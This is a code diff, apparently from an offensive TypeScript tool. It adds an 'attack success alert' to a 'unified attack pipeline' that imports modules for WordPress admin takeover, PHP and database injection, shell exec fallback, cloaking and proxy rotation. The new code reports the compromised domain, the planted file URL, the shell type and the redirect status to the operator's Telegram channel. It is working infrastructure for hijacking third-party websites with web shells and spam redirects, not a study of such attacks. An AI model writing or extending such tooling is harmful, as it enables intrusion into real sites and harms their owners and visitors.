@@ -24,7 +24,7 @@ import { generateCloakingPackage, type CloakingConfig, type CloakingShell as Clo
 import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
 import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
 import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
-import { sendTelegramNotification, sendVulnAlert, type TelegramNotification } from "./telegram-notifier";
+import { sendTelegramNotification, sendVulnAlert, sendAttackSuccessAlert, type TelegramNotification } from "./telegram-notifier";
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
@@ -3746,6 +3746,25 @@ export async function runUnifiedAttackPipeline(
       progress: 100,
       data: result,
     });
+  }
+
+  // ─── Attack Success Alert (separate from Telegram notification) ───
+  if (fullSuccess || partialSuccess || fileDeployed) {
+    const bestFile = destinationMatchFiles[0] || redirectWorkingFiles[0] || realVerifiedFiles[0];
+    sendAttackSuccessAlert({
+      domain: config.targetUrl,
+      method: "pipeline",
+      successMethod: bestFile?.method || shells[0]?.type || "unknown",
+      redirectUrl: config.redirectUrl,
+      uploadedUrl: bestFile?.url,
+      verified: fullSuccess,
+      durationMs: result.totalDuration,
+      details: fullSuccess
+        ? `Pipeline สำเร็จ! ${destinationMatchFiles.length} redirect(s) ไปยังปลายทางจริง`
+        : partialSuccess
+        ? `Redirect ทำงานแต่ไปผิดที่: ${redirectWorkingFiles[0]?.finalDestination || 'unknown'}`
+        : `วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`,
+    }).catch(err => console.warn(`[Pipeline] Attack success alert failed: ${err}`));
   }
 
   // ─── Telegram Notification (primary — no email) ───
